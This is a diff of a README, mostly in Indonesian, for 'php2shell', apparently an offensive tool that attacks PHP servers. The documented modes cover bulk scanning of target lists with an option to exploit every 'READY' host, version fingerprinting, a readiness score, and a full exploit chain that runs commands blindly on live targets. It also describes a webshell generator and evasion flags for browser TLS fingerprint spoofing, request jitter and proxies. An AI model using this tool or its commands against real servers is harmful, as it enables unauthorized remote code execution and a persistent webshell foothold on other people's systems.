@@ -196,13 +196,83 @@ php2shell exploit -u https://target.example/ --yes -c 'id'
 
 ## ❖ Modes
 
-| Mode | What it does |
+### `scan -l targets.txt` — banyak target sekaligus
+
+```bash
+php2shell.py scan -l targets.txt                     # detect + preflight semua
+php2shell.py scan -l targets.txt --exploit --yes     # + exploit yang READY saja
+php2shell.py scan -l targets.txt --threads 10        # paralel
+php2shell.py scan -l targets.txt --json out/r.json --csv out/r.csv
+```
+
+Format file: satu URL/baris, `#` komentar, duplikat dibuang (case & trailing
+slash dianggap sama), baris tanpa `://` otomatis `https://`.
+Hasil: tabel terminal + JSON + CSV (verdict, versi, skor, ready, proof).
+
+### `detect -u URL` — intip versi (read-only, tidak menyerang)
+
+```bash
+php2shell.py detect -u https://target.example/
+```
+Membaca: versi PHP (header/X-Powered-By/error page), branch & fix-floor
+verdict (vulnerable/patched/EOL), status `session.upload_progress`,
+status `display_errors`. Zaranya GET biasa.
+
+### `preflight -u URL` — skor kesiapan + blocker
+
+```bash
+php2shell.py preflight -u https://target.example/
+```
+Skor 0–90 dari: versi rentan (30), upload_progress On (30), display_errors
+On (15), versi dikenali (15). **Filosofi: deteksi = informasi, bukan gerbang** —
+versi tersembunyi CDN tetap lanjut; blocker keras cuma 2: server mati, atau
+versi TERBACA sudah-patch.
+
+### `exploit -u URL` — rantai penuh
+
+```bash
+# lab lokal (mount /out) → hasil perintah TERBACA:
+php2shell.py exploit -u http://127.0.0.1:8095/index.php --force --yes \
+    --exploit-profile bookworm -c 'id>/out/p1'
+
+# live target → BLIND (perintah jalan, output tak terbaca — by design):
+php2shell.py exploit -u https://target.example/ --yes -c 'id'
+```
+Opsi penting:
+| Flag | Fungsi |
 |---|---|
-| `scan -l targets.txt` | multi-target from file: comment/blank handling, dedupe (case + trailing-slash), auto-https, JSONL/CSV report; `--exploit` touches READY targets only |
-| `detect -u URL` | read-only fingerprint: PHP version, branch, fix-floor verdict, upload_progress, display_errors |
-| `preflight -u URL` | readiness score 0–90 + hard blockers — **detection is information, not a gate** |
-| `exploit -u URL` | full 0→3 chain with the command fence + auto-proof |
-| `shell` | password-protected webshell generator (bcrypt, 32-hex filename, per-command whitelist, TTL) — generates only, never uploads |
+| `-c / --cmd` | perintah proof, maks 14 byte; default `id` |
+| `--allow-cmd CMD` | tambah whitelist (ls/cat/df/uname/dll) — berulang |
+| `--exploit-profile {bookworm,lab}` | set offset bawaan (bookworm = image resmi) |
+| `--zif-offset / --dtor-offset / --htdata-offset` | offset manual utk build lain |
+| `--retries N` | retry per stage (default 3, heap-fresh via rotasi worker) |
+| `--huge-mb N` | ukuran field OOM stage-1 (default 12) |
+| `--force` | paksa lewat preflight TIDAK-READY (tetap konfirmasi) |
+| `--exploit-timeout N` | batas waktu total rantai (default 300s) |
+
+### `shell` — generator webshell berpassword
+
+```bash
+php2shell.py shell --out shell/out --ttl 72
+```
+Menghasilkan file PHP (nama 32-hex) + `CREDENTIALS.txt` (bcrypt, TIDAK
+disimpan di shell). Fitur: password bcrypt, whitelist perintah per shell,
+TTL kedaluwarsa, rate limit. **Generator saja — tidak meng-upload.**
+Uji lokal: `php -l <file>` lalu `php -S 127.0.0.1:8099`.
+
+### Flag global (berlaku semua mode)
+
+| Flag | Fungsi |
+|---|---|
+| `--ja3 {chrome,safari,firefox,edge,android}` | profil TLS+UA browser (default chrome) |
+| `--delay N` | jeda antar request + jitter (default 1.0s; jitter 0.75–1.35×) |
+| `--timeout N` | timeout HTTP per request (default 15s) |
+| `--proxy URL` | lewat proxy, mis. `http://127.0.0.1:8080` |
+| `--audit FILE` | catat SEMUA request ke JSONL (bukti + troubleshooting) |
+| `--no-upload-progress` | skip probe upload_progress saat detect |
+| `--no-display-errors` | skip probe display_errors saat detect |
+| `--json / --csv` | output file laporan |
+| `-v` | verbose — tampilkan tiap request |
 
 ---
 
